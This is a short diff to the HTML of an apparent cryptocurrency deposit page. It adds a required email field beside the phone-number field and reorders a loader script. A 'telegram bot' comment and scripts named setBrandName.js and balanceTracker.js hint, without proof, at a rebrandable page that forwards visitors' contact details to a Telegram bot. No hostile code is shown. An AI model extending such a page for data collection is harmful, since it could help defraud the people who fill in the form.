@@ -175,6 +175,23 @@
       </div>
       <div class="deposit-crypto__field">
         <div class="deposit-crypto__main">
+          <label style="    font-weight: 400;
+            font-size: 14px;">Email</label>
+          <input style="margin: 0;
+            display: block;
+            width: 100%;
+            border: none;
+            outline: none;
+            font-weight: 700;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;" required id="email_input" type="text">
+        </div>
+        <img src="./img/bitcoin.svg" alt="" width="40" height="40">
+
+      </div>
+      <div class="deposit-crypto__field">
+        <div class="deposit-crypto__main">
           <label>Phone number</label>
           <div class="deposit-crypto__wrapper">
             <select id="country_codes" class="country_code_form" style="max-width: 45px; border-radius: 3px;"></select>
@@ -400,8 +417,8 @@
   <script src="assets/vendor/appear.js"></script>
   <script src="assets/js/getPrices.js"></script>
   <!-- telegram bot -->
+  <script type="module" src="assets/js/loader.js"></script>
   <script src="assets/js/balanceTracker.js"></script>
-  <script src="assets/js/loader.js"></script>
   <script src="assets/js/setBrandName.js"></script>
   <script>
     (function (u) {
